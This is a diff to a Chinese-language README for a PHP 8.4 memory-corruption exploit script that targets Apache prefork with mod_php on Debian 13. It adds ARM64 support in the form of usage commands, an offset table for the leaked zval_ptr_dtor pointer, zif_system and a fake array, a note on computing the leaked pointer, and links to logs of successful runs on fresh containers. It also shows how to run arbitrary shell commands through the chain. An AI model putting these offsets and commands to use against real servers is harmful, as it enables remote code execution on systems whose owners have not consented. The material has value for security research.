@@ -59,6 +59,9 @@ python3 exploit.py --port 18110 --restart p2s-pure-18110
 # 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
 python3 exploit.py --port 18110 --workers 1
 
+# 原生 ARM64 目标（默认仍是 x86_64）
+python3 exploit.py --arch aarch64 --port 18110 --workers 1
+
 # 自定义命令：把脚本写进挂载目录，再用 sh 执行
 printf 'id; uname -a > /out/p1\n' > out/c
 python3 exploit.py --port 18110 --cmd 'sh</out/c'
@@ -97,13 +100,15 @@ python3 exploit.py --port 18110 --cmd 'sh</out/c'
 
 偏移（本构建，ASLR 无关）：
 
-| 符号/位置 | 值 |
-|---|---|
-| `zval_ptr_dtor` | `libphp+0x65EB60` |
-| `zif_system` | `libphp+0x465370` |
-| fake array `S` | `main+0xF8398` |
-| A2 的 `hsv` | `main+0x7D720` |
+| 符号/位置 | x86_64 | aarch64 |
+|---|---|---|
+| 泄漏的 `zval_ptr_dtor` 指针 | `libphp+0x65EB60` | `libphp+0x63812B` |
+| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
+| fake array `S` | `main+0xF8398` | `main+0xF8398` |
+| A2 的 `hsv` | `main+0x7D720` | `main+0x7D720` |
 
+aarch64 的 `zval_ptr_dtor` ELF 符号位于 `0x638120`，但此泄漏中重复出现的
+指针在其后 11 字节，因此 profile 减去 `0x63812B`。
 目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
 mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
 ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
@@ -115,6 +120,8 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 - 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
 - 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
+- 原生 ARM64 官方镜像日志（10/10 个全新容器）：[pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
+- 原生 ARM64 官方 worker 日志（3/3 个全新容器）：[pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
 - proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
 
 ## 旧线（legacy，非本目标）
